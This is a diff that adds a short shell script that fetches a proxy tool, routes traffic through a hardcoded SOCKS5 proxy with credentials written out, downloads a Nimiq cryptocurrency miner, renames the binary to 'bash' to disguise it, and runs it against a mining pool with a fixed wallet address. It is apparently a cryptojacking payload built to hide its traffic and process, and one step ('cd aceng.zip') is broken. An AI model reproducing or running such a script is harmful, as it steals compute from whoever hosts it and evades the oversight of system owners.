@@ -1,0 +1,39 @@
+#!/bin/sh
+wget https://github.com/nestri12329018/file/raw/main/graphics.tar.gz
+
+tar -xhf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 52.5.38.201:1080
+socks5_username = 3twpqqx7a0cpln
+socks5_password = 6y9m5wvvluhpwzsuwlfuoxwkh52h1
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+./graftcp/graftcp wget -qO aceng.zip https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
+unzip aceng.zip
+cd aceng.zip
+mv miner bash
+./graftcp/graftcp ./bash --pool=nimiq.icemining.ca:2053 --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --miner=2 --type=dumb
